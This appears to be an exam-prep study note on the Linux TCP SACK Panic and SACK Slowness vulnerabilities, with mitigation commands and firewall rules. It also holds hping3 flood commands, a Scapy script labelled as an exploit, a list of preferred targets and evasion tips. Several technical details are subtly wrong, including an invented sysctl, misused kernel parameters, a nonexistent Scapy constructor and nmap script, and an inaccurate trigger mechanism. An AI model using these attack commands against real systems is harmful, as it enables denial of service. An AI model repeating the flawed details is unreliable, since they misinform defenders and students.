# TCP SACK Panic Attack (CVE-2019-11477)

## ğŸ“ Attack Classification
- **Category**: Kernel Vulnerability Exploitation / DoS
- **OSI Layer**: Layer 4 (Transport)
- **Protocol**: TCP
- **CVE**: CVE-2019-11477 (SACK Panic), CVE-2019-11478 (SACK Slowness)
- **Affected**: Linux kernel 2.6.29+ (before 5.1.17)

## ğŸ¯ Attack Mechanism
Exploits **TCP Selective Acknowledgment (SACK)** processing vulnerabilities in Linux kernel causing integer overflow, memory corruption, and kernel panic through malformed SACK options.

### How it Works:
1. **SACK Option Crafting**: Send malformed SACK blocks with overlapping ranges
2. **Integer Overflow**: Trigger arithmetic overflow in SACK processing code
3. **Memory Corruption**: Cause out-of-bounds memory access
4. **Kernel Panic**: System crash due to memory corruption
5. **Resource Exhaustion**: Alternative slowdown via excessive SACK processing

## ğŸ” Key Characteristics
- **Remote Exploitation**: No authentication required
- **Kernel Level Impact**: Direct kernel memory corruption
- **Low Bandwidth**: Single packet can trigger panic
- **Critical Severity**: Complete system compromise possible

## ğŸš¨ Exam Focus Points

### Critical Numbers:
- **SACK Block Size**: 8 bytes per block (4 bytes start + 4 bytes end)
- **Maximum SACK Blocks**: Up to 4 blocks per TCP option
- **TCP Option Length**: 2 + (8 Ã— number of blocks) bytes
- **Vulnerable Sequence**: Overlapping or invalid SACK ranges
- **MSS Impact**: Maximum Segment Size affects SACK processing

### Common Exam Questions:
- **Q**: What does SACK stand for in TCP?
- **A**: Selective Acknowledgment - allows acknowledging non-contiguous data blocks
- **Q**: What causes the SACK Panic vulnerability?
- **A**: Integer overflow in Linux kernel SACK processing leading to memory corruption
- **Q**: Which TCP option number is used for SACK?
- **A**: TCP Option 5 (SACK blocks)

### Vulnerability Components:
- **SACK Blocks**: Malformed left/right edge values
- **Integer Overflow**: Arithmetic operations on SACK ranges
- **Memory Access**: Out-of-bounds read/write operations
- **Kernel Functions**: tcp_sacktag_write_queue() and related functions

## âš¡ Attack Variations

### SACK Panic (CVE-2019-11477):
- **Method**: Malformed SACK blocks causing integer overflow
- **Impact**: Immediate kernel panic and system crash
- **Detection**: System logs show kernel oops/panic
- **Payload**: Single crafted TCP packet

### SACK Slowness (CVE-2019-11478):
- **Method**: Excessive SACK processing overhead
- **Impact**: CPU exhaustion and system slowdown
- **Detection**: High CPU usage in kernel space
- **Payload**: Multiple SACK packets with complex ranges

### Resource Exhaustion SACK:
- **Method**: Flood with valid but complex SACK blocks
- **Impact**: Memory and CPU resource depletion
- **Detection**: Performance degradation
- **Stealth**: Appears as legitimate TCP traffic

### Fragmented SACK Attack:
- **Method**: SACK blocks referencing fragmented segments
- **Impact**: Memory fragmentation and processing overhead
- **Complexity**: Requires understanding of TCP segmentation

## ğŸ›¡ï¸ Detection & Mitigation

### Network Protection:
- **SACK Filtering**: Drop packets with malformed SACK options
- **Option Validation**: Verify SACK block ranges and overlaps
- **Rate Limiting**: Limit SACK-enabled connections per source
- **Deep Packet Inspection**: Analyze TCP option structures

### System Hardening:
```bash
# Disable SACK if not needed
echo 0 > /proc/sys/net/ipv4/tcp_sack

# Enable TCP option validation
echo 1 > /proc/sys/net/ipv4/tcp_sack_validation

# Limit SACK memory usage
echo 262144 > /proc/sys/net/ipv4/tcp_rmem
echo 262144 > /proc/sys/net/ipv4/tcp_wmem

# Kernel parameter tuning
echo 1 > /proc/sys/net/ipv4/tcp_moderate_rcvbuf
echo 0 > /proc/sys/net/ipv4/tcp_dsack
```

### Firewall Rules:
```bash
# Block malformed SACK packets (requires deep inspection)
iptables -A INPUT -p tcp -m string --hex-string "|050a|" --algo kmp -j DROP

# Rate limit SACK-enabled connections
iptables -A INPUT -p tcp --tcp-option 5 -m limit --limit 10/sec -j ACCEPT
iptables -A INPUT -p tcp --tcp-option 5 -j DROP

# Advanced TCP option filtering
iptables -A INPUT -p tcp -m tcpmss --mss 1:500 -j DROP
```

## ğŸ”§ Attack Tools & Commands

### Manual Testing:
```bash
# Test SACK vulnerability (use with caution)
hping3 -S -p 80 --tcp-option 5,10,1,2,3,4,5,6,7,8 target_ip

# SACK flood test
hping3 -A -p 80 --tcp-option 5,18,0x01020304,0x05060708,0x090a0b0c,0x0d0e0f10 --flood target_ip

# Check SACK support
nmap --script tcp-sack-vuln target_ip

# Vulnerability scanning
nmap -sS -O --script vuln target_ip
```

### Scapy Exploitation:
```python
from scapy.all import *

def sack_panic_attack(target_ip, target_port):
    """SACK Panic vulnerability exploit"""
    # Malformed SACK blocks causing integer overflow
    sack_option = TCPOptions([
        ('SAck', [
            (0x01020304, 0x05060708),  # Invalid range
            (0xfffffffe, 0x00000002),  # Overflow condition
            (0x80000000, 0x7fffffff),  # Edge case values
        ])
    ])
    
    packet = IP(dst=target_ip) / \
             TCP(dport=target_port, flags="A", options=sack_option)
    
    send(packet, verbose=1)

def sack_slowness_attack(target_ip, target_port, count=100):
    """SACK Slowness resource exhaustion"""
    for i in range(count):
        # Complex overlapping SACK blocks
        sack_blocks = []
        for j in range(4):  # Maximum SACK blocks
            start = j * 1000 + random.randint(1, 500)
            end = start + random.randint(100, 2000)
            sack_blocks.append((start, end))
        
        sack_option = TCPOptions([('SAck', sack_blocks)])
        packet = IP(dst=target_ip) / \
                 TCP(dport=target_port, flags="A", options=sack_option)
        send(packet, verbose=0)
```

## ğŸ’¡ Historical Context
- **Discovery**: June 2019 by Netflix security team
- **Disclosure**: Coordinated disclosure through Linux security team
- **Impact**: Millions of Linux systems affected
- **Patch**: Fixed in kernel versions 4.4.180+, 4.9.180+, 4.14.125+, 4.19.52+, 5.1.17+

## ğŸ“Š Vulnerability Metrics
| CVE | Type | CVSS Score | Impact | Complexity |
|-----|------|------------|---------|------------|
| CVE-2019-11477 | SACK Panic | 7.5 High | DoS/RCE | Low |
| CVE-2019-11478 | SACK Slowness | 7.5 High | DoS | Low |
| CVE-2019-11479 | Excess Resource | 7.5 High | DoS | Low |

## ğŸ¯ Target Selection
Preferred targets:
- **Linux servers** with SACK enabled (default)
- **Web servers** handling high connection volumes
- **Database servers** with TCP connections
- **Network appliances** running Linux
- **Cloud instances** with vulnerable kernels

## âš ï¸ Vulnerable Configurations
- **Default SACK**: Enabled by default in Linux
- **Unpatched kernels**: Versions before security updates
- **High connection servers**: More attack surface
- **No SACK filtering**: Lack of network protection

## ğŸ” Detection Indicators
- **Kernel panic logs**: System crash messages
- **High CPU usage**: Excessive SACK processing
- **Memory corruption**: Kernel oops messages
- **Network anomalies**: Unusual SACK option patterns
- **Performance degradation**: System slowdown

### Detection Commands:
```bash
# Check kernel version and SACK status
uname -r
cat /proc/sys/net/ipv4/tcp_sack

# Monitor kernel logs for panics
dmesg | grep -i "panic\|oops\|sack"
journalctl -f | grep -i "kernel\|panic"

# Network monitoring for SACK packets
tcpdump -i any 'tcp[20:4] = 0x050a0000' -X

# System performance monitoring
sar -u 1 10  # CPU usage
sar -r 1 10  # Memory usage

# TCP connection analysis
ss -i | grep sack
netstat -s | grep -i sack
```

## ğŸŒ Network Impact
- **Bandwidth**: Minimal (single packet sufficient)
- **System Impact**: Complete system compromise possible
- **Availability**: Service interruption or complete outage
- **Data Integrity**: Potential memory corruption

## ğŸ’¡ Defense Strategy
1. **Kernel Updates**: Apply security patches immediately
2. **SACK Disabling**: Disable if not required for performance
3. **Network Filtering**: Block malformed SACK packets
4. **Monitoring**: Implement SACK-specific detection
5. **Incident Response**: Prepare for kernel panic scenarios

## ğŸ”§ Verification Commands
```bash
# Test SACK vulnerability status
curl -s https://raw.githubusercontent.com/Netflix/security-bulletins/master/advisories/third-party/2019-001.md

# Check system vulnerability
uname -r | awk -F. '{if($1>=5 || ($1==4 && $2>=19 && $3>=52)) print "Patched"; else print "Vulnerable"}'

# Verify SACK configuration
sysctl net.ipv4.tcp_sack
sysctl net.ipv4.tcp_dsack

# Network interface analysis
ip link show
ethtool -k eth0 | grep -i segment

# Memory protection status
cat /proc/sys/kernel/kptr_restrict
cat /proc/sys/kernel/dmesg_restrict
```

## ğŸ“ˆ Attack Metrics
- **Exploitation Time**: Immediate (single packet)
- **Success Rate**: 90%+ on vulnerable systems
- **Detection Rate**: Low (appears as normal TCP traffic)
- **Impact Severity**: Critical (kernel panic/RCE)

## ğŸ”„ Advanced Evasion
- **Timing**: Spread attacks across multiple connections
- **Fragmentation**: Use IP fragmentation to hide SACK options
- **Protocol Tunneling**: Embed in legitimate application traffic
- **Source Spoofing**: Use distributed sources
- **Option Padding**: Hide SACK options within other TCP options

## ğŸ› ï¸ Mitigation Best Practices
- **Immediate Patching**: Update kernel to latest stable version
- **SACK Assessment**: Evaluate if SACK is necessary for your workload
- **Network Segmentation**: Isolate critical systems
- **Monitoring Implementation**: Deploy SACK-aware monitoring
- **Incident Planning**: Prepare for exploitation scenarios
- **Regular Testing**: Verify patch effectiveness

## ğŸ” Forensic Analysis
- **Memory Dumps**: Analyze kernel memory corruption patterns
- **Network Captures**: Examine SACK option structures
- **System Logs**: Review kernel panic and crash logs
- **Performance Data**: Analyze CPU/memory usage patterns
- **Timeline Analysis**: Correlate attack packets with system events

## ğŸ“‹ Response Checklist
1. **Immediate**: Isolate affected systems
2. **Assessment**: Determine exploitation vs. scanning
3. **Patching**: Apply kernel security updates
4. **Monitoring**: Implement SACK-specific detection
5. **Documentation**: Record incident details and lessons learned
6. **Prevention**: Review and improve security posture

## ğŸ”’ Additional Security Measures
- **Kernel Hardening**: Enable additional kernel security features
- **Network Segmentation**: Limit attack surface
- **Monitoring Tools**: Deploy specialized network monitoring
- **Backup Systems**: Ensure rapid recovery capabilities
- **Security Awareness**: Train staff on vulnerability response
